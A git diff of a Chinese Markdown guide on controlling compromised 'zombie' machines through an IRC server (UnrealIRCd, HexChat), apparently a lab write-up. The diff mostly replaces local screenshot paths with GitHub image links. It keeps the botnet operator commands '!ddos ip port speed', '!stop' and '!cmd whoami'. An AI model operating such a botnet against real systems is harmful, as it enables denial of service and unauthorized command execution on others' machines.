@@ -1,4 +1,4 @@
-# 利用IRC批量控制肉鸡进行ddos
+# 利用IRC批量控制肉鸡
 
 ## 安装unrealircd
 
@@ -37,7 +37,8 @@ tail -f /home/irc/unrealircd/logs/ircd.log#查看日志
 
 连接 ip/port（记得点enter才会保存）
 
-![屏幕截图 2025-12-03 163743](C:\Users\hp\Pictures\Screenshots\屏幕截图 2025-12-03 163743.png)
+<img width="952" height="683" alt="屏幕截图 2025-12-03 163743" src="https://github.com/user-attachments/assets/decfab4d-be92-41cd-8634-ecae2794d773" />
+
 
 /join #bot
 
@@ -48,14 +49,15 @@ tail -f /home/irc/unrealircd/logs/ircd.log#查看日志
 ## 攻击流程及实验结果
 
 在hexchat上输入!ddos ip port speed
+<img width="523" height="85" alt="image-20251202155732002" src="https://github.com/user-attachments/assets/1e01fcaa-3fc5-4356-bfbc-9a8fc8abe32b" />
 
 !stop停止攻击
 
-![image-20251202155732002](C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20251202155732002.png)
-
 命令执行
+!cmd dir 或！cmd whoami测试
 
-![屏幕截图 2025-12-03 163545](C:\Users\hp\Pictures\Screenshots\屏幕截图 2025-12-03 163545.png)
+<img width="481" height="326" alt="屏幕截图 2025-12-03 163545" src="https://github.com/user-attachments/assets/466a396d-5bee-4638-a5e1-03d75b1239a5" />
+
 
 在攻击机上
 
@@ -64,5 +66,6 @@ tail -f /home/irc/unrealircd/logs/ircd.log#查看日志
 ```
 
 
+<img width="603" height="133" alt="image-20251202154017607" src="https://github.com/user-attachments/assets/58fb953c-c591-4bca-9024-cc18476f1654" />
 
-![image-20251202154017607](C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20251202154017607.png)
+
